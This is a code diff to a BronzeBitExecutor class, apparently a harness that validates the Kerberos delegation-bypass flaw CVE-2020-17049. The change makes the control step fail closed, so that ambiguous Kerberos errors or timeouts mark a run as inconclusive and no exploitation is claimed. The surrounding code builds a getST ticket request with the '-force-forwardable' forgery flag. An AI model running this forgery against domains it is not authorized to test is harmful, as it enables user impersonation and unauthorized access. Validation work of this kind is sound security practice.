@@ -128,8 +128,19 @@ class BronzeBitExecutor(ValidationExecutor):
             errors.append("ordinary_delegation")
             return self._result(steps, errors, None, False, svc, impersonate, spn,
                                 target_host, "ordinary_delegation", cfg)
+        # The control must CONCLUSIVELY fail non-forwardable (KDC_ERR_BADOPTION) to establish
+        # the CVE case. A timeout / transport / tool / other error is INCONCLUSIVE -- it does
+        # NOT prove ordinary delegation fails, so a later forged success must not read as
+        # `exploited` (round-2 HIGH). Fail closed: no exploit claim, no capability.
+        ctrl_reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or ""))
+        if res.timed_out or res.error or ctrl_reason != "not_delegatable":
+            note = ctrl_reason or ("timeout" if res.timed_out else (res.error or "no_rejection"))
+            rec("getST_control", ctrl_argv, res, False, note=f"control inconclusive ({note})")
+            errors.append("inconclusive:control_inconclusive")
+            return self._result(steps, errors, None, False, svc, impersonate, spn,
+                                target_host, "inconclusive", cfg)
         rec("getST_control", ctrl_argv, res, False,
-            note="control non-forwardable (as the CVE case requires)")
+            note="control conclusively non-forwardable (KDC_ERR_BADOPTION)")
 
         # 2) POSITIVE -- -force-forwardable (the CVE-2020-17049 forgery).
         getst_argv = base_argv + ["-force-forwardable"] + key_and_target
